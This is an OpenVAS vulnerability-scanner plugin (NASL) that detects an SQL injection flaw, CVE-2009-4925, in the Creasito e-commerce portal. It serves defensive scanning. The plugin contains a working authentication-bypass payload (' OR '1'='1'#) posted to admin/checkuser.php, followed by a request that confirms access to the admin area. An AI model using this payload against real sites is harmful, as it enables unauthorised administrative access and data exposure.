###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_creasito_sql_inj_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Creasito 'username' SQL Injection Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to cause SQL Injection attack
  and gain sensitive information.
  Impact Level: Application";
tag_affected = "Portale e-commerce Creasito 1.3.16";
tag_insight = "The flaw is caused by improper validation of user-supplied input passed via
  the 'username' parameter to admin/checkuser.php and checkuser.php, which
  allows attacker to manipulate SQL queries by injecting arbitrary SQL code.";
tag_solution = "No solution or patch is available as of 15th July, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/creasito/.";
tag_summary = "This host is running Creasito and is prone to SQL injection
  vulnerability.";

if(description)
{
  script_id(801230);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-07-19 10:09:06 +0200 (Mon, 19 Jul 2010)");
  script_cve_id("CVE-2009-4925");
  script_bugtraq_id(34605);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Creasito 'username' SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/34809");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/8497");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/502818/100/0/threaded");

  script_description(desc);
  script_summary("Determine if Creasito is prone to SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir (make_list("/creasito", "/Creasito", "/", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/index.php"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application
  if(">Portale e-commerce Creasito <" >< res)
  {
    ## Construct attack request
    req=string(
        "POST ", dir, "/admin/checkuser.php HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "User-Agent: Mozilla/4.75 [en] (X11, U OpenVAS)",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*\r\n",
        "Accept-Language: en-us,en;q=0.5\r\n",
        "Accept-Encoding: gzip,deflate\r\n",
        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
        "Cookie: PHPSESSID=0b3df1f62407f0caec93393927dab908\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: 64\r\n",
        "\r\n",
        "username=-1%27+OR+%271%27%3D%271%27%23&password=foo&Submit=Entra");
    res = http_keepalive_send_recv(port:port, data:req);

    ## Try to Access Admin Area
    req = http_get(item:string(dir, "/admin/amministrazione.php"),  port:port);
    req = string(chomp(req), '\r\nCookie: ',
                 'PHPSESSID=0b3df1f62407f0caec93393927dab908\r\n\r\n');
    res = http_keepalive_send_recv(port:port, data:req);

    ## Confirm exploit worked by checking the response
    if('>ADMIN AREA<' >< res && '>Cambio Password <' >< res)
    {
      security_hole(port);
      exit(0);
    }
  }
}
